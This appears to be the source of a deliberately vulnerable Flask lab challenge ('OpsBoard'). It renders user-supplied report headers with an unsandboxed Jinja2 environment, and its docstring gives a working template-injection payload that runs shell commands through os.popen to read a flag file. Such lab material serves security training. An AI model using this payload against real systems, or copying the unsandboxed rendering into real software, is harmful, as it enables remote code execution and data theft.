"""inj3 (OpsBoard) -- SSTI: the custom report header is rendered by Jinja2.

The header string is rendered with a bare, unsandboxed jinja2.Environment.
Recon: {{ 7 * 7 }} comes back as 49. RCE via a jinja2 default global:
    {{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}
Flag: /flag/flag, live. The app itself never reads the flag.
"""
from datetime import date
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)


_HEAD = """<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OpsBoard</title><style>:root{--bg:#f6f4ee;--panel:#fff;--ink:#222;--mut:#6b6b6b;--ac:#2f6f4f;--ac2:#e7f1ea;--hd:var(--ac);--line:#ddd;--code:#14201a;--codeink:#cfe9d8;--in:#fff}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.55 system-ui,-apple-system,Segoe UI,sans-serif}header{background:var(--hd);color:#fff;padding:14px 28px;display:flex;align-items:center;gap:14px;box-shadow:0 2px 8px #0003}header .logo{font-size:28px;line-height:1}header b{font-size:19px;letter-spacing:.4px;display:block}header small{opacity:.8;font-size:12px;display:block}header nav{margin-left:auto}header nav a{color:#fff;opacity:.85;margin-left:18px;text-decoration:none;font-size:14px}header nav a:hover{opacity:1;text-decoration:underline}main{max-width:880px;margin:26px auto;padding:0 18px}h1{font-size:22px;margin:0 0 8px}h2{font-size:15px;margin:24px 0 8px;text-transform:uppercase;letter-spacing:.6px;color:var(--mut)}p{margin:.3em 0 1em}form{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;margin:0 0 16px;box-shadow:0 1px 3px #0001;display:flex;flex-wrap:wrap;gap:12px;align-items:flex-end}label{display:flex;flex-direction:column;font-size:11px;font-weight:700;color:var(--mut);gap:4px;text-transform:uppercase;letter-spacing:.5px}input,select,textarea{font:14px ui-monospace,SFMono-Regular,Menlo,monospace;padding:8px 10px;border:1px solid var(--line);border-radius:6px;background:var(--in);color:var(--ink);min-width:190px;text-transform:none;letter-spacing:0;font-weight:400}input:focus,select:focus,textarea:focus{outline:2px solid var(--ac);outline-offset:0}textarea{width:100%}label:has(textarea){flex:1 1 100%}button{background:var(--ac);color:#fff;border:0;border-radius:6px;padding:9px 20px;font-weight:700;cursor:pointer;font-size:14px}button:hover{filter:brightness(1.12)}pre{background:var(--code);color:var(--codeink);padding:14px 16px;border-radius:8px;overflow:auto;white-space:pre-wrap;word-break:break-all;font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;border:1px solid #0003}code{background:var(--ac2);color:var(--ink);padding:1px 6px;border-radius:4px;font-size:13px}a{color:var(--ac)}a.back{display:inline-block;margin-top:6px;text-decoration:none;font-weight:600}.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;margin:0 0 16px;box-shadow:0 1px 3px #0001}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin:0 0 16px}.stat{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px}.stat b{display:block;font-size:24px;color:var(--ac)}.stat span{font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px}table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:0 0 16px}th,td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--line);font-size:14px}th{background:var(--ac2);font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--mut)}.pill{display:inline-block;padding:1px 9px;border-radius:99px;font-size:12px;font-weight:700;background:var(--ac2);color:var(--ac)}.ok{color:#1b8a4b}.warn{color:#c47a00}.bad{color:#c0392b}ul{padding-left:20px}.hint{color:var(--mut);font-size:13px}footer{text-align:center;color:var(--mut);font-size:12px;padding:26px}:root{--bg:#0f1420;--panel:#171e2e;--ink:#e6ebf5;--mut:#8a96b0;--ac:#4c8dff;--ac2:#1d2a47;--hd:#0a0e17;--line:#263049;--code:#0a0e17;--codeink:#9fc0ff;--in:#0f1420}header{border-bottom:1px solid #263049}.stat b{color:#6fa3ff}</style></head><body><header><span class="logo">📊</span><div><b>OpsBoard</b><small>Store operations · monthly report</small></div><nav><a href="/">Reports</a></nav></header><main>"""
_TAIL = """</main><footer>OpsBoard · Aev lab environment · training use only</footer></body></html>"""


def page(body):
    return _HEAD + body + _TAIL
env = Environment()  # the "template helper" -- no sandbox, no restrictions


@app.route("/")
def index():
    return page(
        "<h1>Monthly Report</h1>"
        "<p>Build the header for the store operations report. "
        "The header is a template: <code>{{ report_date }}</code> is "
        "replaced with today's date.</p>"
        '<div class="grid">'
        '<div class="stat"><b>1,204</b><span>titles sold</span></div>'
        '<div class="stat"><b>3,881</b><span>active members</span></div>'
        '<div class="stat"><b>+4.2%</b><span>vs last month</span></div></div>'
        '<form action="/report" method="post">'
        '<label>header '
        '<input name="header" size="52" value="{{ report_date }} — Aev Store"></label> '
        "<button>render</button></form>")


@app.route("/report", methods=["POST"])
def report():
    header = request.form.get("header", "")
    rendered = env.from_string(header).render(
        report_date=date.today().isoformat(), store="Aev Store")
    return page("<h1>Report preview</h1><pre>" + rendered + "</pre>"
                "<table><tr><th>metric</th><th>value</th></tr>"
                "<tr><td>Store</td><td>Aev Store</td></tr>"
                "<tr><td>Titles sold (month)</td><td>1,204</td></tr>"
                "<tr><td>Active members</td><td>3,881</td></tr></table>"
                "<a class='back' href='/'>← back</a>")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
